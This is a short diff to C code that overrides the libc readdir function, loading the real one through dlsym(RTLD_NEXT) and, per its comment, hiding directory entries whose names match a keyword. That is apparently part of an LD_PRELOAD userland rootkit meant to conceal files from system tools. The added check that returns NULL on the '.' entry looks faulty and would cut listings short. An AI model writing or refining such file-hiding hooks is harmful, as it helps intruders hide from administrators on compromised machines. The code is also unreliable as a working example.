@@ -122,8 +122,15 @@ struct dirent *readdir(DIR *dirp){
     if(!old_readdir){
 	old_readdir = dlsym(RTLD_NEXT,"readdir");
     }
-    
+
     dir = old_readdir(dirp);
+
+    if(dir == NULL){
+	return 0;
+    }
+    if(strcmp(dir->d_name, ".\0") == 0){
+	return 0;
+    }
 
     //hides via keyword. Needs more testing
     if(strstr(dir->d_name, keyword)){
